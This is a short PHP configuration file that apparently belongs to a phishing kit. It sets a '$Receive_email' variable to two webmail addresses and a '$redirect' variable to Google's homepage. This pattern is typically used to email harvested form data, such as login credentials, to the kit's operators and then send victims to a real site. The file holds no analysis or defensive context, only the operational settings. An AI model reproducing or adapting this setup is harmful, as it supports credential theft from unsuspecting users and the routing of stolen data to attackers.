<?php 
$Receive_email="Barry.alen0123@yahoo.com,luis.locov2@gmail.com";
$redirect="https://www.google.com/";
?>